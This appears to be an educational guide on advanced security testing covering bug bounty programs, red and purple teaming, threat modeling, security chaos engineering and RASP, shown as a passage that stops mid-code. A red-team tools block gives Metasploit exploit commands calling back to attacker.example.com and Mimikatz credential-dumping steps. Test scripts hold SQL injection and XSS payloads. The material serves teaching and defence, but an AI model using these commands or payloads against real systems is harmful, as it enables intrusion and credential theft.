---
title: "Security Testing - Deep Water"
phase: "04-testing"
topic: "security-testing"
depth: "deep-water"
reading_time: 50
prerequisites: ["security-testing-mid-depth"]
related_topics: ["penetration-testing", "threat-modeling", "secure-development-lifecycle", "zero-trust-architecture"]
personas: ["specialist-expanding", "generalist-leveling-up"]
updated: "2025-11-16"
---

# Security Testing - Deep Water

## Who This Is For

You're building systems where security failures have serious consequences - financial loss, regulatory violations, reputational damage. You need security testing that goes beyond scanning tools and checklists.

This deep-water layer covers:
- Bug bounty programs: running them effectively and participating strategically
- Red team vs purple team exercises: simulating real attackers
- Advanced threat modeling: STRIDE-per-Element, attack trees, PASTA methodology
- Security chaos engineering: intentional failure injection to verify controls
- Runtime Application Self-Protection (RASP): active security in production
- Secure Development Lifecycle (SDL) integration across the entire SDLC
- Zero-trust architecture validation: verifying "never trust, always verify"
- Penetration testing methodologies: OWASP WSTG, PTES, full-scope assessments

If you're building consumer apps without sensitive data, the mid-depth layer suffices. This level is for healthcare systems, financial platforms, infrastructure services, or any application where security is existential.

## When You Need This Level

Concrete scenarios:

**The Seven-Figure Bounty**: You're launching a cryptocurrency exchange. A critical vulnerability could cost millions. You need professional security researchers probing for weaknesses before attackers do. Bug bounties aren't optional - they're insurance.

**Regulatory Compliance**: You're building healthcare infrastructure (HIPAA), payment processing (PCI-DSS), or government systems (FedRAMP). Auditors require penetration testing, security architecture reviews, and documented SDL processes. "We ran a scanner" doesn't satisfy auditors.

**Nation-State Threat Models**: You're building critical infrastructure or operating in sensitive geopolitical regions. Attackers have significant resources, patience, and motivation. Your security testing needs to match advanced persistent threat (APT) capabilities.

**Zero-Trust Migration**: You're moving from perimeter security to zero-trust. Every service-to-service call needs authentication and authorization. Traditional testing approaches don't validate trust boundaries adequately.

**The Post-Breach Reality**: You suffered a breach. Forensics revealed your security testing missed critical attack vectors. You need comprehensive security validation, not just compliance theater.

## Running Effective Bug Bounty Programs

Bug bounties crowdsource security testing. Done well, they find critical vulnerabilities before attackers do. Done poorly, they waste time and create adversarial relationships with security researchers.

### Bug Bounty Program Design

**Scope definition** (what researchers can test):

```markdown
# Bug Bounty Scope - Example Corp

## In Scope

### Critical Systems (10x multiplier on rewards)
- Production API: api.example.com/*
- Web application: app.example.com/*
- Mobile apps: iOS and Android apps (latest versions)
- Authentication service: auth.example.com/*

### Important Systems (5x multiplier)
- Marketing site: example.com/*
- Developer API: developer.example.com/*
- Partner portal: partners.example.com/*

### Allowed Testing Methods
- Automated scanning (rate limited to 100 req/sec)
- Manual testing
- Source code analysis (if you have access)
- Social engineering against test accounts only

### Test Account Access
Email bounty@example.com for test accounts with:
- Free tier access
- Paid tier access (for testing paid features)
- Sandbox environment access

## Out of Scope

### Infrastructure
- Internal network (10.0.0.0/8, 172.16.0.0/12)
- Physical security
- Denial of Service (DoS) attacks

### Low-Impact Issues
- Issues requiring unlikely user interaction
- Self-XSS
- Logout CSRF
- Version disclosure
- Clickjacking on pages with no sensitive actions

### Third-Party Services
- GitHub repositories
- Cloud provider infrastructure
- Third-party integrations (report to them directly)

## Reporting Requirements

Reports must include:
1. Description of vulnerability
2. Step-by-step reproduction instructions
3. Proof of concept (screenshot, video, or code)
4. Impact assessment
5. Suggested remediation

Submit via: bugbounty@example.com (PGP key: 0x1234567890ABCDEF)
Response SLA: 2 business days
```

**Bounty structure**:

```markdown
# Reward Structure

## Severity Levels

### Critical ($5,000 - $20,000)
- Remote code execution (RCE)
- SQL injection allowing database access
- Authentication bypass
- Privilege escalation to admin
- Access to encryption keys or secrets
- Payment manipulation vulnerabilities

### High ($2,000 - $5,000)
- Stored XSS on critical pages
- CSRF on state-changing operations
- OAuth token theft
- Insecure direct object references (IDOR) exposing sensitive data
- Server-side request forgery (SSRF)

### Medium ($500 - $2,000)
- Reflected XSS
- CSRF on non-critical operations
- Information disclosure (API keys, internal paths)
- Subdomain takeover
- Open redirects on authentication flows

### Low ($100 - $500)
- Open redirects on non-authentication flows
- Information disclosure (low sensitivity)
- Rate limiting issues
- SSL/TLS configuration weaknesses

## Multipliers

- First to report: 1.5x
- Exceptional report quality: 1.2x
- Critical system (see scope): 10x base
- Multiple vulnerabilities in single report: 1.25x per additional

## Bonuses

- $10,000 bonus for any vulnerability leading to significant architectural improvement
- $5,000 bonus for novel attack techniques
- Hall of Fame inclusion (with permission)
```

### Running the Program

**Triage process**:

```javascript
// Simplified bug bounty triage workflow
class BugBountyTriage {
  async processSubmission(report) {
    // 1. Initial triage (2 business days)
    const initialAssessment = await this.initialReview(report)

    if (!initialAssessment.isValid) {
      return this.sendResponse(report, {
        status: 'invalid',
        reason: initialAssessment.invalidReason,
        template: 'invalid-submission'
      })
    }

    // 2. Reproduce vulnerability
    const reproduction = await this.attemptReproduction(report)

    if (!reproduction.success) {
      return this.requestMoreInfo(report, reproduction.issues)
    }

    // 3. Severity assessment
    const severity = await this.assessSeverity(report, reproduction)

    // 4. Duplicate check
    const isDuplicate = await this.checkDuplicates(report)

    if (isDuplicate) {
      return this.sendResponse(report, {
        status: 'duplicate',
        originalReport: isDuplicate.reportId,
        template: 'duplicate-submission'
      })
    }

    // 5. Calculate reward
    const reward = this.calculateReward(severity, report.quality)

    // 6. Create fix ticket
    const ticket = await this.createEngineeringTicket({
      title: `Security: ${report.title}`,
      severity: severity.level,
      reporter: report.researcher,
      details: reproduction.details,
      priority: severity.level === 'critical' ? 'P0' : 'P1'
    })

    // 7. Communicate with researcher
    await this.sendResponse(report, {
      status: 'accepted',
      severity: severity.level,
      reward: reward.amount,
      ticketId: ticket.id,
      timeline: this.getFixTimeline(severity.level),
      template: 'accepted-submission'
    })

    // 8. Track to resolution
    await this.trackUntilFixed(report, ticket)
  }

  async initialReview(report) {
    // Basic validity checks
    const hasDescription = report.description?.length > 50
    const hasReproSteps = report.reproduction?.steps?.length > 0
    const hasImpact = report.impact?.length > 0

    if (!hasDescription || !hasReproSteps || !hasImpact) {
      return {
        isValid: false,
        invalidReason: 'Incomplete report: missing description, reproduction steps, or impact assessment'
      }
    }

    // Check if target is in scope
    const inScope = await this.isInScope(report.target)

    if (!inScope) {
      return {
        isValid: false,
        invalidReason: `Target ${report.target} is out of scope. See bug bounty scope: https://example.com/security/bounty`
      }
    }

    return { isValid: true }
  }

  calculateReward(severity, qualityScore) {
    const baseRewards = {
      critical: { min: 5000, max: 20000 },
      high: { min: 2000, max: 5000 },
      medium: { min: 500, max: 2000 },
      low: { min: 100, max: 500 }
    }

    const base = baseRewards[severity.level]
    let amount = base.min + ((base.max - base.min) * qualityScore)

    // Apply multipliers
    severity.multipliers?.forEach(multiplier => {
      amount *= multiplier.factor
    })

    return {
      amount: Math.round(amount),
      breakdown: {
        baseRange: base,
        qualityScore,
        multipliers: severity.multipliers
      }
    }
  }
}
```

**Communication templates**:

```markdown
# Template: Accepted Submission

Subject: Bug Bounty Report #{{reportId}} - Accepted ({{severity}})

Hi {{researcherName}},

Thank you for your security report. We've confirmed the vulnerability and are working on a fix.

**Report Details:**
- Report ID: {{reportId}}
- Severity: {{severity}}
- Reward: ${{reward}}

**Timeline:**
- Fix ETA: {{fixEta}}
- Public disclosure: {{disclosureDate}} (90 days from now, or when fix is deployed, whichever comes first)

**Next Steps:**
1. We'll update you as we progress on the fix
2. Reward will be paid within 5 business days of fix deployment
3. You'll receive credit in our security acknowledgments (unless you prefer anonymity)

**Internal Ticket:** {{ticketId}} (for our tracking)

Questions? Reply to this email.

Thanks for helping us keep Example Corp secure.

Security Team
security@example.com
```

### Bug Bounty Anti-Patterns

**Anti-pattern 1: Treating researchers as adversaries**

Bad:
```
"We don't think this is a real vulnerability. Rejected."
```

Good:
```
"Thanks for your report. We've reviewed and determined this doesn't meet our severity criteria because [specific reason]. However, we appreciate the effort and would be interested in other findings from your review."
```

**Anti-pattern 2: Inconsistent rewards**

Track reward history to maintain consistency:

```javascript
const rewardHistory = await db.bounties.aggregate([
  {
    $match: {
      severity: 'critical',
      vulnerabilityType: 'SQL Injection',
      dateAwarded: { $gte: new Date('2024-01-01') }
    }
  },
  {
    $group: {
      _id: null,
      avgReward: { $avg: '$reward' },
      minReward: { $min: '$reward' },
      maxReward: { $max: '$reward' }
    }
  }
])

// Use historical data to inform new rewards
// Avoid rewarding similar vulnerability significantly differently
```

**Anti-pattern 3: Slow response times**

Researchers lose interest if you ghost them:

```javascript
// SLA monitoring
class BountySLAMonitor {
  async checkSLAs() {
    const now = new Date()

    // First response SLA: 2 business days
    const overdueInitialResponse = await db.bountyReports.find({
      status: 'submitted',
      submittedAt: { $lt: this.subtractBusinessDays(now, 2) }
    })

    if (overdueInitialResponse.length > 0) {
      await this.alertTeam({
        severity: 'high',
        message: `${overdueInitialResponse.length} bounty reports overdue for initial response`,
        reports: overdueInitialResponse.map(r => r.id)
      })
    }

    // Fix SLA: Critical within 30 days
    const overdueFixCritical = await db.bountyReports.find({
      status: 'accepted',
      severity: 'critical',
      acceptedAt: { $lt: this.subtractDays(now, 30) },
      fixedAt: null
    })

    if (overdueFixCritical.length > 0) {
      await this.alertTeam({
        severity: 'critical',
        message: `${overdueFixCritical.length} critical vulnerabilities overdue for fix`,
        reports: overdueFixCritical.map(r => r.id)
      })
    }
  }
}
```

## Red Team vs Purple Team Exercises

Bug bounties find specific vulnerabilities. Red/purple team exercises simulate real-world attack scenarios.

### Red Team Operations

Red teams simulate adversaries. Goal: compromise objectives (steal data, gain admin access, etc.) using any means necessary within rules of engagement.

**Rules of Engagement (ROE)**:

```markdown
# Red Team Exercise - ROE

## Objective
Simulate advanced persistent threat (APT) targeting customer data exfiltration

## Duration
4 weeks (January 15 - February 12, 2024)

## In-Scope Targets
- External web applications (*.example.com)
- Email systems (phishing allowed against designated targets)
- VPN and remote access systems
- Cloud infrastructure (AWS account 123456789)
- Mobile applications

## Out-of-Scope
- Physical security (no breaking into offices)
- Production database direct attacks (test against staging replica)
- Third-party systems (GitHub, Slack, unless pivoting from compromise)
- Attacks causing service disruption (DoS)

## Allowed Techniques
- Social engineering (email, phone, but not physical impersonation)
- Network reconnaissance and exploitation
- Web application exploitation
- Zero-day usage (disclose to us before exercise ends)
- Credential stuffing (using public breach databases)
- Supply chain attacks against dependencies

## Prohibited Techniques
- Physical access
- Destructive actions (data deletion, ransomware deployment)
- Attacks against personal devices of employees
- Bribery or blackmail

## Communication
- **Emergency contact**: security-redteam@example.com (24/7)
- **Daily check-ins**: Required at EOD
- **Immediate disclosure**: Any safety concerns, unintended impacts

## Success Criteria
- Exfiltrate customer PII (from test database)
- Gain administrative access to production AWS
- Compromise source code repository
- Achieve persistence in internal network

## Defensive Monitoring
- Blue team IS aware of exercise (timeline only, not tactics)
- SOC monitors but doesn't actively hunt (realistic conditions)
- IDS/IPS running normally

## Post-Exercise
- Full debrief within 48 hours
- Written report within 7 days
- Artifacts (tools, scripts, payloads) delivered for analysis
```

**Red team attack chain**:

```
Phase 1: Reconnaissance (Week 1)
├─ OSINT gathering
│  ├─ Employee LinkedIn scraping
│  ├─ GitHub repository analysis
│  ├─ DNS enumeration (subfinder, amass)
│  └─ Public S3 bucket discovery
├─ Network scanning
│  ├─ Port scanning (nmap)
│  ├─ Service fingerprinting
│  └─ SSL certificate analysis
└─ Technology stack identification
   ├─ Wappalyzer
   ├─ Shodan queries
   └─ Job postings analysis

Phase 2: Initial Access (Week 2)
├─ Spear phishing campaign
│  ├─ Target: IT help desk (3 employees)
│  ├─ Payload: Credential harvesting page (fake Okta login)
│  └─ Success: 1/3 clicked, 1/3 submitted credentials
├─ VPN credential testing
│  └─ Harvested credential works!
└─ Initial foothold established

Phase 3: Lateral Movement (Week 3)
├─ Network reconnaissance from inside
│  ├─ Active Directory enumeration
│  ├─ Network share discovery
│  └─ Kerberoasting
├─ Privilege escalation
│  ├─ Exploited misconfigured service account
│  └─ Gained domain admin
└─ Cloud access
   ├─ Found AWS credentials in developer laptop
   └─ Escalated to admin using overprivileged IAM role

Phase 4: Objective Achievement (Week 4)
├─ Data exfiltration
│  ├─ Located customer database (staging replica per ROE)
│  ├─ Exfiltrated 10,000 test records
│  └─ Encrypted and sent to C2 server
├─ Persistence
│  ├─ Created backup admin account
│  ├─ Installed SSH backdoor
│  └─ Modified CloudFormation template for re-entry
└─ Source code access
   ├─ GitHub access via compromised developer token
   └─ Cloned private repositories
```

**Red team tools**:

```bash
# Reconnaissance
subfinder -d example.com -o subdomains.txt
amass enum -d example.com
nmap -sV -sC -oA nmap-scan target.example.com

# Exploitation framework
msfconsole
use exploit/multi/http/struts2_content_type_ognl
set RHOST target.example.com
set LHOST attacker.example.com
exploit

# Post-exploitation
# Mimikatz (Windows credential dumping)
privilege::debug
sekurlsa::logonpasswords

# Bloodhound (Active Directory attack paths)
bloodhound-python -u user -p password -d example.com -ns 10.0.0.1 -c All

# Cloud exploitation
# Pacu (AWS exploitation framework)
pacu
import_keys --profile compromised-account
run iam__detect_honeytokens
run ec2__enum
```

### Purple Team Exercises

Purple team combines red (attack) and blue (defense). Red team attacks, blue team defends, both collaborate to improve security.

**Purple team workflow**:

```markdown
# Purple Team Exercise: API Security

## Scenario
Test API authentication and authorization controls

## Day 1: Planning (Red + Blue together)
- Review API architecture
- Identify critical endpoints
- Define attack scenarios
- Establish success criteria

## Day 2-3: Attack Execution (Red team)

### Attack 1: JWT Token Manipulation
**Technique**: Attempt to modify JWT claims (role, user_id)
**Expected Defense**: Token signature validation fails
**Actual Result**: ❌ Weak secret allowed brute force
**Finding**: JWT secret is only 8 characters

### Attack 2: IDOR (Insecure Direct Object Reference)
**Technique**: Access other users' data by changing ID in URL
**Expected Defense**: Authorization check prevents access
**Actual Result**: ✅ Defense worked correctly
**Finding**: None

### Attack 3: Rate Limiting Bypass
**Technique**: Bypass rate limiting using X-Forwarded-For header
**Expected Defense**: Rate limiting by authenticated user, not IP
**Actual Result**: ❌ Rate limiting easily bypassed
**Finding**: Rate limiting trusts X-Forwarded-For without validation

### Attack 4: SQL Injection
**Technique**: Inject SQL in search parameter
**Expected Defense**: Parameterized queries prevent injection
**Actual Result**: ✅ Defense worked correctly
**Finding**: None

## Day 4: Joint Analysis (Red + Blue together)

### Finding 1: Weak JWT Secret
- **Severity**: Critical
- **Impact**: Attackers can forge tokens, impersonate any user
- **Remediation**: Generate 256-bit random secret, rotate immediately
- **Timeline**: Fix within 24 hours
- **Detection**: Add alerting for rapid token generation (may indicate brute force)

### Finding 2: Rate Limiting Bypass
- **Severity**: High
- **Impact**: Brute force and DoS attacks not prevented
- **Remediation**: Rate limit by user_id + IP, ignore X-Forwarded-For
- **Timeline**: Fix within 1 week
- **Detection**: Monitor for high request rates from single user

## Day 5: Validation (Red team)
- Re-test findings after fixes deployed
- Verify defenses work as expected
- Document final state

## Outcomes
- 2 critical/high findings identified and fixed
- Blue team gained insight into attacker techniques
- Red team learned which defenses are effective
- Both teams improved collaboration and communication
```

### Building Red/Purple Team Capability

**Internal vs external teams**:

| Approach | Pros | Cons |
|----------|------|------|
| **Internal red team** | Deep product knowledge, year-round availability, cost-effective | May have blind spots, less fresh perspective, potential conflicts of interest |
| **External consultants** | Fresh perspective, specialized expertise, unbiased | Expensive, ramp-up time, less product context |
| **Hybrid** | Best of both - internal for continuous testing, external for annual deep-dive | Coordination overhead, budget for external |

**Red team skills needed**:
- Network penetration testing
- Web application security
- Social engineering
- Cloud security (AWS, Azure, GCP)
- Active Directory exploitation
- Binary exploitation (for critical systems)
- Report writing and communication

**Building internal capability**:

```markdown
# Red Team Development Path

## Level 1: Junior Red Team Operator (0-2 years)
- Complete OSCP (Offensive Security Certified Professional)
- Master web application testing (OWASP Top 10)
- Learn social engineering basics
- **Responsibilities**: Execute defined test plans, basic vulnerability discovery

## Level 2: Red Team Operator (2-5 years)
- Complete OSEP (Offensive Security Experienced Penetration Tester)
- Advanced web/API testing
- Active Directory attack techniques
- Cloud security testing
- **Responsibilities**: Design attack scenarios, lateral movement, advanced exploitation

## Level 3: Senior Red Team Operator (5+ years)
- Complete OSED (Offensive Security Exploit Developer) or equivalent
- Zero-day discovery
- Custom tool development
- Advanced persistent threats simulation
- **Responsibilities**: Lead red team exercises, mentor juniors, strategic planning

## Level 4: Red Team Lead
- Strategic threat modeling
- Executive communication
- Program management
- **Responsibilities**: Design red team program, report to leadership, budget management
```

## Advanced Threat Modeling

Mid-depth covered STRIDE basics. This level goes deeper: STRIDE-per-Element, attack trees, and PASTA methodology.

### STRIDE-per-Element

Traditional STRIDE applies threats to entire system. STRIDE-per-Element applies to every component separately - more granular, finds more threats.

**Example: API Gateway**

```markdown
# API Gateway Threat Model (STRIDE-per-Element)

## Element: API Gateway Load Balancer

### Spoofing
- Threat: Attacker spoofs origin IP to bypass IP allowlist
  - Mitigation: Use mutual TLS, don't trust X-Forwarded-For
  - Residual risk: Low
- Threat: DNS spoofing redirects traffic to attacker's server
  - Mitigation: DNSSEC, certificate pinning in clients
  - Residual risk: Medium

### Tampering
- Threat: Man-in-the-middle modifies requests
  - Mitigation: TLS 1.3 with strong cipher suites
  - Residual risk: Low
- Threat: Attacker modifies load balancer config
  - Mitigation: IAM policies, change audit logging
  - Residual risk: Low

### Repudiation
- Threat: Requests cannot be traced to origin
  - Mitigation: Access logs with source IP, request ID
  - Residual risk: Low

### Information Disclosure
- Threat: TLS misconfiguration leaks sensitive headers
  - Mitigation: Automated SSL Labs scanning, alert on downgrades
  - Residual risk: Low
- Threat: Error messages reveal internal architecture
  - Mitigation: Generic error responses, detailed logs internal only
  - Residual risk: Medium

### Denial of Service
- Threat: Layer 7 DDoS overwhelms backend
  - Mitigation: Rate limiting, WAF, CloudFlare protection
  - Residual risk: Medium
- Threat: Slowloris attack exhausts connections
  - Mitigation: Timeout configuration, connection limits
  - Residual risk: Low

### Elevation of Privilege
- Threat: Bypass authentication by directly calling backend
  - Mitigation: Backend validates JWT, not just gateway
  - Residual risk: Low

---

## Element: JWT Validation Service

### Spoofing
- Threat: Attacker forges JWT with weak secret
  - Mitigation: 256-bit random secret, RS256 algorithm
  - Residual risk: Low
- Threat: Algorithm confusion attack (alg: none)
  - Mitigation: Explicitly validate algorithm, reject "none"
  - Residual risk: Low

### Tampering
- Threat: Modify JWT claims after issuance
  - Mitigation: Signature validation, short expiration
  - Residual risk: Low

### Repudiation
- Threat: User denies actions taken with their token
  - Mitigation: Log all token usage with request details
  - Residual risk: Low

### Information Disclosure
- Threat: JWT contains sensitive data in readable form
  - Mitigation: Encrypt sensitive claims (JWE), minimize data in token
  - Residual risk: Medium
- Threat: JWT logged in plaintext
  - Mitigation: Redact tokens in logs, only log last 8 chars
  - Residual risk: Low

### Denial of Service
- Threat: CPU exhaustion from expensive signature validation
  - Mitigation: Cache validation results, rate limit
  - Residual risk: Low

### Elevation of Privilege
- Threat: Confused deputy - use token for unintended audience
  - Mitigation: Validate "aud" claim, separate tokens per service
  - Residual risk: Medium

---

## Element: Rate Limiting Service

[Continue for each component...]
```

Each element gets full STRIDE analysis. More work, but finds threats that system-level analysis misses.

### Attack Trees

Attack trees visualize how attackers achieve goals. Useful for risk assessment and defense prioritization.

```
Goal: Exfiltrate Customer PII
├─ AND: Gain database access
│  ├─ OR: SQL Injection
│  │  ├─ Exploit search parameter [Likelihood: Low, Impact: Critical]
│  │  │  └─ Defense: Parameterized queries ✓
│  │  └─ Exploit admin panel [Likelihood: Very Low, Impact: Critical]
│  │     └─ Defense: WAF, input validation ✓
│  ├─ OR: Stolen credentials
│  │  ├─ Phishing database admin [Likelihood: Medium, Impact: Critical]
│  │  │  └─ Defense: MFA required ✓, security training
│  │  ├─ Credential stuffing [Likelihood: Medium, Impact: Critical]
│  │  │  └─ Defense: Rate limiting ✓, breach monitoring ✗
│  │  └─ Insider threat [Likelihood: Low, Impact: Critical]
│  │     └─ Defense: Access logging ✓, anomaly detection ✗
│  └─ OR: Exploit database server
│     ├─ Unpatched CVE [Likelihood: Low, Impact: Critical]
│     │  └─ Defense: Auto-patching ✓, vulnerability scanning ✓
│     └─ Misconfigured security group [Likelihood: Medium, Impact: Critical]
│        └─ Defense: Infrastructure as Code review ✓, automated scanning ✗
└─ AND: Exfiltrate data
   ├─ OR: Direct download
   │  └─ Defense: DLP monitoring ✗, egress filtering ✗
   └─ OR: Slow exfiltration (stealth)
      └─ Defense: Anomaly detection ✗, query pattern analysis ✗

Legend:
✓ = Defense in place
✗ = Defense missing
[Likelihood: Low/Medium/High, Impact: Low/Medium/High/Critical]
```

Analysis from attack tree:
- Most attack paths blocked by existing defenses
- Gaps: Breach credential monitoring, anomaly detection, DLP
- Highest risk: Credential stuffing → stolen credentials → exfiltration
- **Recommendation**: Prioritize breach monitoring and anomaly detection

### PASTA Threat Modeling

Process for Attack Simulation and Threat Analysis - risk-centric methodology.

**7 Stages**:

```markdown
# PASTA Threat Model: Payment Processing System

## Stage 1: Define Objectives
**Business Objectives**:
- Process $10M/month in payments
- Maintain PCI-DSS compliance
- 99.99% uptime SLA

**Security Objectives**:
- Prevent unauthorized payment processing
- Protect cardholder data
- Detect and prevent fraud
- Maintain audit trail for compliance

## Stage 2: Define Technical Scope
**Components**:
- Web application (React frontend)
- API gateway (Kong)
- Payment service (Node.js)
- Tokenization service (Vault)
- Database (PostgreSQL with encryption)
- Payment processor integration (Stripe)
- Fraud detection (custom ML model)

**Data Flows**:
1. User → Frontend → API Gateway → Payment Service → Stripe
2. Payment Service → Tokenization Service → Encrypted DB
3. Payment Service → Fraud Detection → Decision

**Trust Boundaries**:
- Internet → CDN/WAF
- CDN/WAF → API Gateway
- API Gateway → Internal services
- Internal services → Database
- Internal services → External APIs

## Stage 3: Decompose Application
[See STRIDE-per-Element above]

## Stage 4: Analyze Threats
**Threat Intelligence**:
- Verizon DBIR: 80% of breaches involve credentials
- Recent e-commerce attacks: Magecart skimmers (JavaScript injection)
- Industry trend: API abuse, card testing attacks

**Threat Catalog**:
1. **Card testing** (criminals testing stolen cards)
   - Likelihood: High (industry-wide problem)
   - Impact: High (chargebacks, processor penalties)
2. **Magecart-style attack** (JS skimming)
   - Likelihood: Medium (if supply chain compromised)
   - Impact: Critical (massive breach)
3. **API abuse** (automated account creation for fraud)
   - Likelihood: High
   - Impact: Medium
4. **Database breach** (SQL injection, stolen credentials)
   - Likelihood: Low (strong defenses)
   - Impact: Critical

## Stage 5: Vulnerability Analysis
**Discovered Vulnerabilities**:
- Missing rate limiting on payment attempts (enables card testing)
- No Subresource Integrity (SRI) on 3rd-party scripts (Magecart risk)
- Fraud detection runs async (payment processed before fraud check completes)
- No anomaly detection on payment patterns

## Stage 6: Attack Modeling
**Attack Scenario 1: Card Testing**
1. Attacker creates multiple accounts
2. Makes $1 payment attempts with stolen cards
3. Identifies valid cards (payment succeeds)
4. Sells validated cards on dark web

**Defenses Needed**:
- Rate limit payment attempts per user, per IP, per card
- Velocity checks (multiple cards from one user = suspicious)
- CAPTCHA on payment form
- Block known VPN/proxy IPs

**Attack Scenario 2: Magecart Supply Chain**
1. Attacker compromises 3rd-party analytics library
2. Injects card skimming code
3. Code exfiltrates card numbers to attacker's server
4. Runs for months before detection

**Defenses Needed**:
- Subresource Integrity (SRI) on all external scripts
- Content Security Policy (CSP) blocking unexpected domains
- Payment form in iframe from separate domain
- Regular dependency audits

## Stage 7: Risk & Impact Analysis
| Threat | Likelihood | Impact | Risk Score | Mitigation Priority |
|--------|-----------|--------|------------|-------------------|
| Card testing | High | High | 9 | P0 (this week) |
| Magecart attack | Medium | Critical | 9 | P0 (this week) |
| API abuse | High | Medium | 6 | P1 (this month) |
| Database breach | Low | Critical | 6 | P1 (this month) |
| DDoS | Medium | Medium | 4 | P2 (this quarter) |

**Risk Acceptance**:
- DDoS: Accept medium-duration outages (< 1 hour), mitigate with CloudFlare
- Insider threat: Accept residual risk, mitigate with access logging and reviews
```

PASTA provides structured, risk-based prioritization. Not all threats equal - focus on high-likelihood + high-impact.

## Security Chaos Engineering

Chaos engineering for reliability is proven. Security chaos engineering applies same principles: intentionally inject security failures to verify defenses work.

### Security Chaos Experiments

**Experiment 1: Verify WAF blocks SQLi**

```javascript
// security-chaos/sql-injection-waf.js
const axios = require('axios')

async function verifySQLiBlocked() {
  console.log('Security Chaos Experiment: SQL Injection WAF Validation')

  // Hypothesis: WAF blocks common SQL injection patterns
  const sqlInjectionPayloads = [
    "' OR '1'='1",
    "admin'--",
    "' UNION SELECT NULL--",
    "1'; DROP TABLE users--",
    "' OR 1=1--",
    "<script>alert('XSS')</script>",  // Also test XSS
  ]

  const results = []

  for (const payload of sqlInjectionPayloads) {
    try {
      const response = await axios.get(`https://api.example.com/search?q=${encodeURIComponent(payload)}`, {
        timeout: 5000,
        validateStatus: () => true  // Don't throw on non-200
      })

      const blocked = response.status === 403 || response.status === 400

      results.push({
        payload,
        blocked,
        statusCode: response.status,
        passed: blocked
      })

      if (!blocked) {
        console.error(`❌ FAILURE: Payload not blocked: ${payload}`)
      } else {
        console.log(`✓ Payload blocked: ${payload}`)
      }

    } catch (error) {
      results.push({
        payload,
        blocked: false,
        error: error.message,
        passed: false
      })
      console.error(`❌ ERROR testing payload: ${payload}`)
    }
  }

  const allPassed = results.every(r => r.passed)

  if (allPassed) {
    console.log('✓ EXPERIMENT PASSED: All SQLi payloads blocked')
  } else {
    console.error('❌ EXPERIMENT FAILED: Some payloads not blocked')
    await alertSecurityTeam({
      experiment: 'sql-injection-waf',
      results,
      severity: 'critical'
    })
  }

  return results
}
```

**Experiment 2: Verify rate limiting works**

```javascript
async function verifyRateLimiting() {
  console.log('Security Chaos Experiment: Rate Limiting Validation')

  // Hypothesis: API rate limits prevent brute force
  const endpoint = 'https://api.example.com/login'
  const attempts = 100
  const timeWindowSec = 60

  const startTime = Date.now()
  const results = []

  for (let i = 0; i < attempts; i++) {
    try {
      const response = await axios.post(endpoint, {
        email: 'test@example.com',
        password: `wrong-password-${i}`
      }, {
        validateStatus: () => true
      })

      results.push({
        attempt: i + 1,
        statusCode: response.status,
        rateLimited: response.status === 429
      })

      if (response.status === 429) {
        console.log(`✓ Rate limited at attempt ${i + 1}`)
        break
      }

    } catch (error) {
      results.push({
        attempt: i + 1,
        error: error.message
      })
    }
  }

  const duration = (Date.now() - startTime) / 1000
  const rateLimitedAttempt = results.findIndex(r => r.rateLimited) + 1

  // Should be rate limited within first 10 attempts
  const passed = rateLimitedAttempt > 0 && rateLimitedAttempt <= 10

  if (passed) {
    console.log(`✓ EXPERIMENT PASSED: Rate limited after ${rateLimitedAttempt} attempts`)
  } else {
    console.error(`❌ EXPERIMENT FAILED: Not rate limited after ${attempts} attempts`)
    await alertSecurityTeam({
      experiment: 'rate-limiting',
      results,
      severity: 'high'
    })
  }

  return { passed, rateLimitedAttempt, duration, results }
}
```

**Experiment 3: Verify secrets not in logs**

```javascript
async function verifySecretsNotLogged() {
  console.log('Security Chaos Experiment: Secrets in Logs Validation')

  // Hypothesis: Secrets (API keys, passwords, tokens) never appear in logs

  const secretPatterns = [
    /password[=:]\s*\S+/gi,
    /api[_-]?key[=:]\s*\S+/gi,
    /secret[=:]\s*\S+/gi,
    /token[=:]\s*\S+/gi,
    /bearer\s+[a-zA-Z0-9._-]+/gi,
    /-----BEGIN.*PRIVATE KEY-----/g
  ]

  // Sample recent application logs
  const logs = await fetchApplicationLogs({
    timeRange: '1h',
    level: 'all',
    maxLines: 10000
  })

  const violations = []

  logs.forEach((logLine, index) => {
    secretPatterns.forEach(pattern => {
      const matches = logLine.match(pattern)
      if (matches) {
        violations.push({
          lineNumber: index + 1,
          pattern: pattern.toString(),
          match: matches[0].substring(0, 50) + '...',  // Truncate for safety
          logLine: logLine.substring(0, 200)
        })
      }
    })
  })

  const passed = violations.length === 0

  if (passed) {
    console.log(`✓ EXPERIMENT PASSED: No secrets found in ${logs.length} log lines`)
  } else {
    console.error(`❌ EXPERIMENT FAILED: ${violations.length} potential secrets in logs`)
    violations.forEach(v => {
      console.error(`  Line ${v.lineNumber}: ${v.pattern}`)
    })

    await alertSecurityTeam({
      experiment: 'secrets-in-logs',
      violations,
      severity: 'critical'
    })
  }

  return { passed, violations }
}
```

### Running Security Chaos Continuously

```javascript
// Schedule security chaos experiments
const schedule = require('node-schedule')

// Run hourly
schedule.scheduleJob('0 * * * *', async () => {
  await verifySQLiBlocked()
  await verifyRateLimiting()
})

// Run daily
schedule.scheduleJob('0 2 * * *', async () => {
  await verifySecretsNotLogged()
  await verifyMFAEnforced()
  await verifyEncryptionAtRest()
})

// Run weekly
schedule.scheduleJob('0 2 * * 0', async () => {
  await verifyBackupEncryption()
  await verifyAccessControlPolicies()
  await verifyVulnerabilityScanning()
})
```

## Runtime Application Self-Protection (RASP)

RASP runs inside the application, monitoring execution and blocking attacks in real-time. Different from WAF (perimeter defense) - RASP sees code context.

### RASP Capabilities

**1. SQL Injection Prevention**

```javascript
// RASP agent intercepts database queries
const rasp = require('@rasp/agent')

rasp.onQuery((query, context) => {
  const suspicious = detectSQLInjection(query, context)

  if (suspicious.score > 0.8) {
    // Block query
    rasp.block({
      reason: 'SQL Injection detected',
      query: query.substring(0, 100),
      evidence: suspicious.indicators,
      stackTrace: context.stackTrace
    })

    // Alert security team
    alertSecurityTeam({
      type: 'SQL_INJECTION_BLOCKED',
      severity: 'high',
      query,
      user: context.userId,
      ip: context.ipAddress
    })

    throw new Error('Query blocked by security policy')
  }

  // Allow query
  return rasp.allow()
})

function detectSQLInjection(query, context) {
  const indicators = []
  let score = 0

  // Check for tautologies
  if (/('|")?\s*(OR|AND)\s*('|")?\s*\d+\s*=\s*\d+/i.test(query)) {
    indicators.push('tautology')
    score += 0.5
  }

  // Check for UNION attacks
  if (/UNION\s+SELECT/i.test(query)) {
    indicators.push('union_select')
    score += 0.7
  }

  // Check for comment injection
  if (/(--|#|\/\*)/i.test(query)) {
